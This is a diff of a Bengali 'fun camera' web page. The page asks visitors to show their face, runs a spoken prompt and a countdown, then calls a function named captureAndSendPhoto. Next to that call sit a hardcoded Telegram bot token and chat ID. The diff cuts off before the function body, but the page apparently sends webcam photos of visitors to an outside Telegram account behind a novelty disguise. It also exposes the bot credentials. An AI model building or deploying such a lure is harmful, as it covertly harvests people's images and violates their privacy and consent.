@@ -2,7 +2,7 @@
 <html lang="bn">
 <head>
   <meta charset="UTF-8">
-  <title>Megical Camera</title>
+  <title>মজার ক্যামেরা</title>
   <style>
     body {
       margin: 0;
@@ -17,17 +17,39 @@
       text-align: center;
       padding: 20px;
     }
+
     #message {
       font-size: 22px;
       color: #00ffcc;
       margin-top: 20px;
     }
-    video {
-      border: 4px solid #00ffcc;
-      border-radius: 12px;
-      width: 90%;
-      max-width: 500px;
+
+    .video-container {
+      position: relative;
+      width: 300px;
+      height: 300px;
+      border-radius: 50%;
+      overflow: hidden;
+      border: 5px solid #00ffcc;
     }
+
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    #timer {
+      position: absolute;
+      bottom: 10px;
+      right: 10px;
+      background: rgba(0, 0, 0, 0.6);
+      padding: 5px 10px;
+      border-radius: 10px;
+      font-size: 20px;
+      color: #00ffcc;
+    }
+
     #notice {
       font-size: 18px;
       color: #ffffff;
@@ -39,6 +61,7 @@
       line-height: 1.8;
       max-width: 90%;
     }
+
     #copyright {
       font-size: 14px;
       color: #cccccc;
@@ -48,8 +71,11 @@
 </head>
 <body>
   <div id="message">আপনার চেহারা ক্যামেরার মধ্যে রাখুন আর মজা দেখুন</div>
-  
-  <video id="video" autoplay playsinline></video>
+
+  <div class="video-container">
+    <video id="video" autoplay playsinline></video>
+    <div id="timer">৫</div>
+  </div>
 
   <div id="notice">
     <b>বিশেষ দ্রষ্টব্য:</b><br>
@@ -59,18 +85,41 @@
   </div>
 
   <script>
+    // Voice instruction on load
+    window.addEventListener('load', () => {
+      const msg = new SpeechSynthesisUtterance("আপনার চেহারাটি ক্যামেরার মধ্যে রাখুন এবং পাঁচ সেকেন্ড পর এর ফলাফল দেখুন");
+      msg.lang = 'bn-BD';
+      msg.pitch = 1;
+      msg.rate = 1;
+      speechSynthesis.speak(msg);
+    });
+
     const telegramBotToken = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
     const telegramChatId = "6429244657";
 
     const video = document.getElementById('video');
+    const timerDisplay = document.getElementById('timer');
 
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        setTimeout(() => {
-          captureAndSendPhoto();
-        }, 5000); // ৫ সেকেন্ড পর ছবি উঠবে
+        let countdown = 5;
+        timerDisplay.textContent = countdown;
+
+        const timerInterval = setInterval(() => {
+          countdown--;
+          timerDisplay.textContent = countdown;
+
+          if (countdown === 1) {
+            captureAndSendPhoto();
+          }
+
+          if (countdown === 0) {
+            clearInterval(timerInterval);
+            timerDisplay.textContent = '';
+          }
+        }, 1000);
       });
 
     function captureAndSendPhoto() {
